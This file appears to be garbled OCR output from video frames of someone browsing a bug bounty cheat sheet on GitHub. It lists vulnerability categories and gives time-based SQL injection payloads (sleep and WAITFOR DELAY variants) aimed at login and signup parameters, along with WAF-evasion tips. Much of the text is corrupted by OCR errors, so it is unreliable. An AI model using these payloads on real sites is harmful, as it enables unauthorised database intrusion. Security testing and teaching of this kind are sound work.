@@ -1,0 +1,209 @@
+--- scene_01.jpg ---
+_.
+re
+pcb oh
+)Vewtcation + Clear
+guideecy & Citirenship
+“i
+1Imonth streak!
+»
+@
+ayer praporgunait | Pre
++
+--- scene_02.jpg ---
+. , UTE BAS irynet Of payloads in reulbre parameters arr
+‘awn an)
+pa 2. Aller you got DELAY, save request in Ul fhe and use saionep lar Konvin and wp
+Bay tepen IEA,
++ Mee
+—a peep 0 rr
+= eaaap +1 FoqUeSE AA °p ema /eterenme <foren=H+h “eve D oorkek 9 stm
+‘Se « change request form POST 10 GET or in reverse
+@ Pane reaeen * USe --randonagent
+(Stee lomt yee
+(2 toon Posemers nrerabiines 3) File Uploaders SQL
+— ‘ave ile with this names and upload it site
+) OME
+= <-steep( 48) 909
+omnes Das Expmre seaamaen iw
+Sh Carte Decegean er PrGiwastfor 191018" oe
+.—— tomorrow I'm.going to
+2S pee
+--- time_01.jpg ---
+prema nicey (care / Vite eaves ARERR SS \
+al /lipes/( ibcrypte.® lptaread «10
+ae ne /emp/pac gree _wonnage eaal es
+| cempe and Tens Once,
+x +
+OD Redi/fusr/sharefall-
+) CD Vedeasimg Ear O)Programming Math
+7
+Gheckour _.sneW intne..  ~* release’of Kall Linux!
+--- time_02.jpg ---
+tomer 7) Pullrequems = © Actions [f]) Projects
+¢
+© coma re sa ORES $ months agc
+@ 2FA bypass ‘Update
+& API Security Update
+Day 2850f doing bug bounty
+Best bug bounty checklist? ~~”
+Boos Create README md
+Update README md
+® File Upload
+Heep Request Smuggling Update README md
+= {Internet Information Services (tis) Update
+& Logsshent
+found this insane
+Bug bounty checklist
+© Rae tint bypass Cpdene READNAE ane
+Update README
+© Reset Password veinerabit ed
+@ ox Updane README me
+Upsuee ReaD
+—— |
+--- time_03.jpg ---
+POieeel 27> + maee .
+= © wource-code-anaiyze-pre * =
+@ CRLF injection = :
+& CSRF Bypass a README smd :
+® Dos — :
+@ File Upload a
+Hep Request Smuggling Pe =
+B imemet information Services (11s) wae =
+& Logeshet ———
+-I-found this insane ,
+Bug,bounty checklist =
+—— Update README 4,
+ms
+& eset Password vutnerabil
+= Update
+MEADOW 4
+—_
+_.
+--- time_04.jpg ---
+~ @ RF)
+© keting
+xs x
+Cc ss
+Oleg @ | EE:
+.
+ict made =~
+guy, cud
+--- time_05.jpg ---
+Just made by this
+guy, Oxmaximus
+--- time_06.jpg ---
+How to find SQL injectiosn vulnerability?
+1) Logical Operation
+2) Time Based SQL Injection
+tn resp er bye 50 pepe OT Ea ee
+Each of them is like
+he CRS
+_
+--- time_07.jpg ---
+a
+you found
+2) Time Based SQL Injection
+Most relative place for inject SQL payloads as [POST Request] are in Login page (username parameter), Forget password ps
+(username parameter), Singup Page (firstname and last name)
+Payloads:
+forwa’ AND (SELECT 6377 FROM (SELECT(SLEEP(5S)))NLTL)-~
+(SiEePx99(14-(5-2)))
+» or sleep(5)="
+Vcaiaseceticereee() sseetst),e) aes
+O°XOR( if (now( )=sysdate(), sleep(12), 0) )XOR"ZK20=N3E
+9° XOR( Af (now( )=sysdate(), steep(3), ©) )XOR'Z
+If,l.wa ni tto,kn O”*—.;-~E
+about SQL injection; —
+a
+--- time_08.jpg ---
+qasernuene parameter), Singuup Page (Hrstname and last name)
+Landon dibs -steep(2), 0) xOR"Z
+{PWR TT (wee pexyscate( ), sleep( 12), ©) )MOR"ZRIOKIE
+O'KAR( LP Coow{ =syscate( ), steep( 3), 0) )XOR'Z
+‘cng ee
+--- time_09.jpg ---
+nagor prapatjuitit [10 *
+: Lae ' %
+: Drive ft inbox
+(Secret ( Harvard Course | @ Google
+p CEngineering
+QL injection
+Upeste READ
+Update SOL
+How to vulnerability
+1) Logical Operation
+is by making
+one of the best[fvays to confirm a SQL injection
+example: if the GET parameter ?username=Peter returns the
+2) Time Based SQL Injection
+Most relative place for inject SQL payloads as [POST Reques}
+(username parameter), Singup Page (firstname and last nar
+Payloads:
+you can see they also
+provide.types of
+*)) Or sleep(5)="
+* WAITFOR DELAY '6:0:5°--
+pwaitfor delay '@:0:5'--
+);waitfor delay '@:0:5'--
+*;wmitfor delay '0:0:5'--
+“;waitfor delay '@:0@:5"--
+*)ywaitfor delay '@:@:5'--
+*);waitfor Gelay "@:0:5'..
+));wmatfor Gelay ‘6:0:5"--
+OKOR( Lf (new )esysaate( ), sLeep(12), ©) )KOR"Z
+O"XOR( if (mow( )esyscate( ), sleep( 12), ©) XOR"Zad@onae
+O° AOR( if (mow )=syscate( ), sleep(3), 0) )xoa'7
+———="_ -—~<
+--- time_10.jpg ---
+@esoro
+rn prapatjuikit | 1D» * OQ Gataxy-Bugbounty-Chea * +
+tire eee, seat
+How to fi
+1) Logical Operation
+R one of the best ways to confirm a SQL injection is by making it operate 2 logical
+example: if the GET parameter ?username=Peter returns the same content as ?u
+you found a SQL injection.
+2) Time Based SQL Injection
+most relative place for inject SQL payloads as [POST Request] are in Login page|
+(username parameter), Singup Page (firstname and last name)
+Payloads:
+u can see the:
+orwa' AND (SELECT esi! Thue (seloul\ 2 ;,also..
+GEPHnNroVv
+scers(provide types of
+* WATTFOR DELAY '0:0:5"--
+swaitfor delay ‘6: --
+}ywaitfor delay '®: :5*--
+*pwaitfor delay '6:0:5"--
+“saitfor delay "9:0:5"--
+‘)pwaitfor delay '9:0:5'--
+*);waitfor delay "@:6:5'--
+));wmitfor delay *9:0;5'--
+Gr KOR ( Af (now{ )=syscate(), Sleep(12), 0) )XOR"Z
+or MOR ( if (now! jenysdate( ), Sleep( 12), 0) )XOR"ZR2O=83E
+e NOR( if (now! )=syscate( ), Sleep(3), 0) )XOR'Z
+———— CN
+--- time_11.jpg ---
+4 ” 4 ood 88 *
+210» €)'Gatery-Bugbounty-Chec)* = +
+_
+CoSecret CoHarvand Course | @ Google Drive fi inbox % Shodan Search Engine @ vam
+_ &
+|
+Pati per seer Tiprbest ts
+SQL and how to find
+itis really
+How fe feet?
+eo
+--- time_12.jpg ---
+‘Sometimes you cant exploits because most modem web apps use WAF & user input validation before execute It'so you can try with:
+* change request form POST to GET or in reverse
+© Use --random-agent
+3) File Uploaders SQLi
+Save file with this names and upload it in site
+e
+--lenp(25) 0
+= aed
+“=SQL-and how to find
+“it is really
